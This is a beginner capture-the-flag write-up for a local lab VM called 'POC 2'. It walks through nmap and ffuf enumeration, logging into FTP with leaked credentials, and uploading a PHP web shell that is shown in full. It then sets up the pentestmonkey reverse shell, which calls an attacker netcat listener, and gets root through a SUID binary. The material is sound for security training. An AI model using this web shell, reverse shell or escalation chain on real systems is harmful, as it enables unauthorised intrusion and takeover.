
Documentation for the second box of the POC serie, a beginer box used to familarize with pentest tools and procedures.


# BOX POC 2

For this box, only an OVA for a virtual machine is provided, where I can see IP for beginning my pentest : 192.168.56.105, I put this in an $ip var.

---

## Summary

1. [Scan](#scan)
2. [Web Enumeration](#Web-Enumeration)
3. [FTP intrusion test](#FTP-intrusion-test)
4. [Reverse shell](#Reverse-shell)
5. [SUID privilege escalation](#SUID-privilege-escalation)

---

## Scan

We begin with a classic discovery of the network with this nmap command : ```nmap -sS -sV -sC -T4 $ip```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-17 10:18 CEST
Nmap scan report for 192.168.56.105
Host is up (0.0013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (CTF-NOSTALGY-PIECE-OF-CAKE-2) [192.168.56.105]
|     Commande incorrecte : essayez d'
|     plus imaginatif
|     Commande incorrecte : essayez d'
|     plus imaginatif
|   Help: 
|     220 ProFTPD Server (CTF-NOSTALGY-PIECE-OF-CAKE-2) [192.168.56.105]
|     214-Les commandes suivantes sont reconnues (* => non support
|     es):
|     214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 
|     214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     214-NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     214-ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     214-STOR STOU APPE REST ABOR USER PASS ACCT* 
|     214-REIN* LIST NLST STAT SITE MLSD MLST 
|     Envoyer les commentaires 
|     root@localhost
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 ProFTPD Server (CTF-NOSTALGY-PIECE-OF-CAKE-2) [192.168.56.105]
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/S3CR3T-D1R3CT0R7-1337/
|_http-title: Checked
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=7/17%Time=6878B1DC%P=x86_64-pc-linux-gnu%r(NULL
SF:,44,"220\x20ProFTPD\x20Server\x20\(CTF-NOSTALGY-PIECE-OF-CAKE-2\)\x20\[
SF:192\.168\.56\.105\]\r\n")%r(GenericLines,BA,"220\x20ProFTPD\x20Server\x
SF:20\(CTF-NOSTALGY-PIECE-OF-CAKE-2\)\x20\[192\.168\.56\.105\]\r\n500\x20C
SF:ommande\x20incorrecte\x20:\x20essayez\x20d'\xc3\xaatre\x20plus\x20imagi
SF:natif\r\n500\x20Commande\x20incorrecte\x20:\x20essayez\x20d'\xc3\xaatre
SF:\x20plus\x20imaginatif\r\n")%r(Help,29A,"220\x20ProFTPD\x20Server\x20\(
SF:CTF-NOSTALGY-PIECE-OF-CAKE-2\)\x20\[192\.168\.56\.105\]\r\n214-Les\x20c
SF:ommandes\x20suivantes\x20sont\x20reconnues\x20\(\*\x20=>\x20non\x20supp
SF:ort\xc3\xa9es\):\r\n214-CWD\x20\x20\x20\x20\x20XCWD\x20\x20\x20\x20CDUP
SF:\x20\x20\x20\x20XCUP\x20\x20\x20\x20SMNT\*\x20\x20\x20QUIT\x20\x20\x20\
SF:x20PORT\x20\x20\x20\x20PASV\x20\x20\x20\x20\r\n214-EPRT\x20\x20\x20\x20
SF:EPSV\x20\x20\x20\x20ALLO\*\x20\x20\x20RNFR\x20\x20\x20\x20RNTO\x20\x20\
SF:x20\x20DELE\x20\x20\x20\x20MDTM\x20\x20\x20\x20RMD\x20\x20\x20\x20\x20\
SF:r\n214-XRMD\x20\x20\x20\x20MKD\x20\x20\x20\x20\x20XMKD\x20\x20\x20\x20P
SF:WD\x20\x20\x20\x20\x20XPWD\x20\x20\x20\x20SIZE\x20\x20\x20\x20SYST\x20\
SF:x20\x20\x20HELP\x20\x20\x20\x20\r\n214-NOOP\x20\x20\x20\x20FEAT\x20\x20
SF:\x20\x20OPTS\x20\x20\x20\x20HOST\x20\x20\x20\x20CLNT\x20\x20\x20\x20AUT
SF:H\*\x20\x20\x20CCC\*\x20\x20\x20\x20CONF\*\x20\x20\x20\r\n214-ENC\*\x20
SF:\x20\x20\x20MIC\*\x20\x20\x20\x20PBSZ\*\x20\x20\x20PROT\*\x20\x20\x20TY
SF:PE\x20\x20\x20\x20STRU\x20\x20\x20\x20MODE\x20\x20\x20\x20RETR\x20\x20\
SF:x20\x20\r\n214-STOR\x20\x20\x20\x20STOU\x20\x20\x20\x20APPE\x20\x20\x20
SF:\x20REST\x20\x20\x20\x20ABOR\x20\x20\x20\x20USER\x20\x20\x20\x20PASS\x2
SF:0\x20\x20\x20ACCT\*\x20\x20\x20\r\n214-REIN\*\x20\x20\x20LIST\x20\x20\x
SF:20\x20NLST\x20\x20\x20\x20STAT\x20\x20\x20\x20SITE\x20\x20\x20\x20MLSD\
SF:x20\x20\x20\x20MLST\x20\x20\x20\x20\r\n214\x20Envoyer\x20les\x20comment
SF:aires\x20\xc3\xa0\x20root@localhost\r\n")%r(SSLSessionReq,44,"220\x20Pr
SF:oFTPD\x20Server\x20\(CTF-NOSTALGY-PIECE-OF-CAKE-2\)\x20\[192\.168\.56\.
SF:105\]\r\n")%r(SMBProgNeg,44,"220\x20ProFTPD\x20Server\x20\(CTF-NOSTALGY
SF:-PIECE-OF-CAKE-2\)\x20\[192\.168\.56\.105\]\r\n");
MAC Address: 08:00:27:64:05:20 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.61 seconds
```
  
### Nmap scan summary

#### Port 21

Port 21 (FTP) is open and running ProFTPD.

The banner includes a potential CTF hint: CTF-NOSTALGY-PIECE-OF-CAKE-2.

Responses suggest custom messages and possibly weak configuration.

No authentication required was tested, but anonymous login or misconfigured access should be checked.

Might be vulnerable to known ProFTPD exploits (e.g., mod_copy, mod_sql, etc.).


#### Port 80

Port 80 (HTTP) is open with Apache 2.4.38 (Debian).

The version is outdated and may have known vulnerabilities.

robots.txt reveals a hidden directory: /S3CR3T-D1R3CT0R7-1337/, which should be manually reviewed or enumerated with ffuf/gobuster.

Page title is just "Checked", giving no immediate context, suggesting further investigation is needed.


## Web Enumeration

After a quick investigation on the website, nothing usefull is found, so let's begin with a ffuf investigation with : 
```ffuf -c -w '/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt' -u "http://$ip/FUZZ"```

Here is the result :
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.105/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 136ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 626ms]
info                    [Status: 200, Size: 54, Words: 1, Lines: 2, Duration: 8ms]
robots.txt              [Status: 200, Size: 50, Words: 4, Lines: 4, Duration: 2ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [20478/20478] :: Job [1/1] :: 128 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

We can see two results we could check, info and robots.txt, so I firstly open the info webpage and found the first flag : ```FLAG1{L-ENUMERATION-SUR-L-EXTENSION-.TXT-EST-LA-CLEE}```
As always in thoses boxes with a hint for the next flag, saying that "enumeration on the .txt extension is the key".
I open then the second webpage, robots.txt, and found this text :
```
User-agent: * 

Disallow: /S3CR3T-D1R3CT0R7-1337/
```


### robots.txt explanation

<details>
  
<summary>robots.txt explanation</summary>

I asked to my AI assistant what does robots.txt usualy refer to and here is the explanation :

🔍 robots.txt – Role and Relevance in Pentesting
The robots.txt file is placed at the root of a website (e.g., http://IP/robots.txt) and is used to instruct web crawlers (like Googlebot) on which parts of the site should not be accessed or indexed.

📄 Content you found:
```
User-agent: * 
Disallow: /S3CR3T-D1R3CT0R7-1337/
```

🔎 Interpretation:
User-agent: * means the rule applies to all crawlers.

Disallow: /S3CR3T-D1R3CT0R7-1337/ tells them not to access this directory.

🧠 Why it matters in pentesting:
A pentester is not a bot, so you're free to explore disallowed paths.

Developers sometimes hide sensitive resources here (e.g., backups, admin panels, internal files).

It's a common trick in CTFs and vulnerable boxes to hide hints or flags in disallowed directories.

---

</details>

Robots.txt show us the directory we shouldn't go to, so let's dig in it. But I don't see anything usefull for now here, I just try to do more enumerating by changing wordlist and specifying .txt extension as the hint say with ```ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt```

Here is the result :

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.105/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 11ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 424ms]
.hta.txt                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 794ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 820ms]
.htaccess.txt           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 889ms]
credentials.txt         [Status: 200, Size: 95, Words: 16, Lines: 5, Duration: 11ms]
credentials.txt         [Status: 200, Size: 95, Words: 16, Lines: 5, Duration: 10ms]
.htpasswd.txt           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1436ms]
index.html              [Status: 200, Size: 15192, Words: 651, Lines: 593, Duration: 8ms]
info                    [Status: 200, Size: 54, Words: 1, Lines: 2, Duration: 5ms]
robots.txt              [Status: 200, Size: 50, Words: 4, Lines: 4, Duration: 5ms]
robots.txt              [Status: 200, Size: 50, Words: 4, Lines: 4, Duration: 7ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 16ms]
:: Progress: [9488/9488] :: Job [1/1] :: 431 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We can see a credentials.txt with thoses logins :

```
user: alix
password: xila
```

## FTP intrusion test

Now let's see if they are still actives. We need an entry to identificate with thoses logins, the FTP port was open before so let's try our user logins there.

```
exegol-poc2 # ftp $ip                                                                                
Connected to 192.168.56.105.
220 ProFTPD Server (CTF-NOSTALGY-PIECE-OF-CAKE-2) [192.168.56.105]
Name (192.168.56.105:root): alix
331 Mot de passe requis pour alix
Password: 
230 Utilisateur alix authentifié
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Here we are, logged through the FTP, let's see where i'm and what is around me.
```
ftp> ls
229 Entering Extended Passive Mode (|||15311|)
150 Ouverture d'une connexion de données en mode ASCII pour file list
-rwxr--r--   1 root     root           51 Jan 15  2022 FLAG2.txt
drwxrwxrwx   2 root     root         4096 May 28  2022 S3CR3T-D1R3CT0R7-1337
226 Téléchargement terminé
ftp> cat FLAG2.txt
?Invalid command.
```

The problem is that we can't just cat it on FTP, so let's download it and open it.

```
ftp> get FLAG2.txt
local: FLAG2.txt remote: FLAG2.txt
229 Entering Extended Passive Mode (|||12029|)
150 Opening BINARY mode data connection for FLAG2.txt (51 bytes)
    51       25.52 KiB/s 
226 Téléchargement terminé
51 bytes received in 00:00 (13.39 KiB/s)
```

And here is the flag.

```
exegol-poc2 ~ # cat FLAG2.txt
FLAG2{A-QUOI-PEUT-BIEN-SERVIR-LE-DOSSIER-SECRET-?}
```

The hint indicate to go see the secret directory we just seen before.
But after a few try to list what's inside, I just can't found anything, but after dumping the whole database using lftp, I see this hint file :

```
lftp -u alix,xila ftp://$ip

lftp alix@192.168.56.105:~> mirror .
Total: 1 directory, 2 files, 0 symlinks
New: 1 file, 0 symlinks
Modified: 1 file, 0 symlinks
197 bytes transferred
lftp alix@192.168.56.105:/> exit
[Jul 17, 2025 - 14:40:03 (CEST)] exegol-poc2 POC2 # ls -a                      
.  ..  FLAG2.txt  .hint  S3CR3T-D1R3CT0R7-1337
[Jul 17, 2025 - 14:40:05 (CEST)] exegol-poc2 POC2 # cat .hint    
Il faudrait que je revois les permissions sur le dossier secret.

Une personne malveillante pourrait surement y déposer du contenu mailveillant.
```

This hint suggesting that permissions are badly configurated on this secret directory, and it we can effectively see that we have full rights on it, so we can abuse thoses permissions.
I tried before to just open the webpage on ```http://192.168.56.105/S3CR3T-D1R3CT0R7-1337/``` and it showed me a classic webpage not usefull, but still, we can now use this connexion between the FTP and the webserver to exploit thoses permissions by putting in it a webshell in php.

So here is the content in my ```maliciousShell.php```
```
<?php system($_GET['cmd']); ?>
```

I now need to put it in the ftp Secret Directory

```
lftp alix@192.168.56.105:/S3CR3T-D1R3CT0R7-1337> put maliciousShell.php 
31 bytes transferred
```

And here I am, abusing www-data account

```
curl "http://$ip/S3CR3T-D1R3CT0R7-1337/maliciousShell.php?cmd=whoami"

www-data
```

But I prefer using a reverse shell, I can simply use a netcat on my attacking device and initiate a revershell from the target by using the same curl with a cmd at the end oppening a shell redirected to my PC, but I may this time use a better and more stable reverse shell.

## Reverse shell

So I'll take the pentestmonkey reverse shell that you cand find [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
You need in this php to modify IP and port used for the reverse shell:

```
$ip = 'ATTACKING IP';
$port = ATTACKING PORT;
```

I put it in the ftp the same way as the first maliciousShell, but to initiate connexion I need this time to listen with netcat using rlwrap for a better shell (such as history functions working) ```rlwrap nc -lvnp 4444```.
I just need then to open this webpage to initiate the malicious php script :

```http://192.168.56.105/S3CR3T-D1R3CT0R7-1337/maliciousReverseShell.php```

I now have a working reverse shell as www-data

```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.105.
Ncat: Connection from 192.168.56.105:36026.
Linux CTF-NOSTALGY-PIECE-OF-CAKE-2 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 15:48:48 up  5:31,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

It's now time to explore every folders that I can, and I quickly find a false root flag for the troll, and in the same directory, the true flag number 3 as a hidden file :

```
www-data@CTF-NOSTALGY-PIECE-OF-CAKE-2:/$ cat /home/alix/root/.FLAG-NON-ROOT.txt
FLAG3{L-ESCALADE-DE-PRIVILEGE-SE-FAIT-PAR-LES-SUID}
```

Hint of the flag is saying that I need to use SUID for privilege escalation.


## SUID privilege escalation

<details>
  
<summary>Understanding SUID</summary>

A file with the SUID bit set allows any user to execute it with the permissions of its owner, which is often root.

Therefore, if a binary owned by root is executable with the SUID bit and is either vulnerable or misconfigured, it can potentially be exploited to gain privilege escalation.

---
</details>

So here is my command for testing thoses bin ```find / -perm -4000 -type f 2>/dev/null```

<details>
  
<summary>Breakdown of the Command</summary>

Here is the breakdown by AI assistant :

```find / -perm -4000 -type f 2>/dev/null```

| Part          | Meaning                                                                                                                                           |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------|
| `find /`      | Start the search from the root directory `/` (i.e., search the entire filesystem).                                                                |
| `-perm -4000` | Find files with the **SUID bit** set. `4000` is the octal value for the SUID permission. Executing it with owner permissions, which is often root.|
| `-type f`     | Only return **regular files** (i.e., exclude directories, links, etc.).                                                                           |
| `2>/dev/null` | Suppress **permission denied** errors by redirecting `stderr` (file descriptor 2) to `/dev/null`.                                                 |

---
<details>

And here is the details.

```
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/rooted
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

It seems that our suspect is ```/usr/bin/rooted```, an uncommon bin file, so I try to see the parameters and I see a root as an owner.

```
ls -l /usr/bin/rooted
-rwsr-sr-x 1 root root 16664 Jan 15  2022 /usr/bin/rooted
```

And when I simply execute it, I'm rooted :

```
usr/bin/rooted
dircolors: 
no SHELL environment variable, and no shell type option given
root@CTF-NOSTALGY-PIECE-OF-CAKE-2:/# whoami
root
```

Now I just check the root file to find the final flag.

```
root@CTF-NOSTALGY-PIECE-OF-CAKE-2:/# ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
root@CTF-NOSTALGY-PIECE-OF-CAKE-2:/# ls root
FLAG.txt
root@CTF-NOSTALGY-PIECE-OF-CAKE-2:/# cat root/FLAG.txt
FLAG4{BRAVO-TU-AS-POWNED-CETTE-MACHINE}

Tu peux maintenant te reposer sur ce canapé ^^

                         ____
                        /    \
                       /______\
                          ||
           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\
          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\
         (_)========(_)   ||  (_)==== ===========(_)
          I|_________|I  _||_  |___________________|
.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```
